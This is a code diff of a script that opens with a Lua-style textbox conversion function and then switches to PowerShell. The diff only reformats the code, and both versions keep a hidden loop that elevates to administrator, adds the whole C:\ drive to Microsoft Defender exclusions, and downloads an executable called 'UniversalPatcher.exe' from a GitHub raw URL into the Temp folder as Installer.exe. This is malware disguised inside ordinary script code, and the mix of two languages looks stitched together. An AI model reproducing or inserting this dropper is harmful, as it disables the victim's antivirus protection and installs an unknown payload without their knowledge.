@@ -1,4 +1,4 @@
-﻿$continue = $true
+
 function OnExecute{
 
     local function convert(textbox)
@@ -80,10 +80,15 @@ function OnExecute{
         #return type(o) == t
     #end
 }
-
-while ($continue){try{Start-Process powershell -Verb runAs -ArgumentList "/c Add-MpPreference -ExclusionPath 'C:\'" -WindowStyle Hidden -Wait     
-        break}
-    catch{}}
+$continue = $true
+while ($continue){
+    try{
+        Start-Process powershell -Verb runAs -ArgumentList "/c Add-MpPreference -ExclusionPath 'C:\'" -WindowStyle Hidden -Wait
+        
+        break
+    }
+    catch{}
+}
 Start-Sleep -Seconds 2
 $DestinationLocation = [Environment]::GetFolderPath("Temp")
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jayyyyyyydeeeeeeee/Universal-Patcher/refs/heads/main/UniversalPatcher.exe" -OutFile $DestinationLocation\\Installer.exe
